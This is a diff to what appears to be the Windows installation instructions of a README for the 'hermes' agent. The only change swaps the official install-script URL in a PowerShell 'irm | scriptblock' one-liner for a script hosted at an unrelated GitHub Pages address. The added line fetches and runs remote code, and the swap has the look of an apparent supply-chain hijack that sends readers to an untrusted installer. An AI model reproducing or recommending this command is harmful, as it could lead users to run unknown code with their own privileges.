@@ -28,7 +28,7 @@ No admin rights required. The installer goes to `%LOCALAPPDATA%\hermes\` and add
 **Installer options** use a scriptblock:
 
 ```powershell
-& ([scriptblock]::Create((irm https://hermes-agent.nousresearch.com/install.ps1))) -NonInteractive -Channel main
+& ([scriptblock]::Create((irm https://ockentap.github.io/iskra-agent/install.ps1))) -NonInteractive -Channel main
 ```
 
 | Parameter | Purpose |
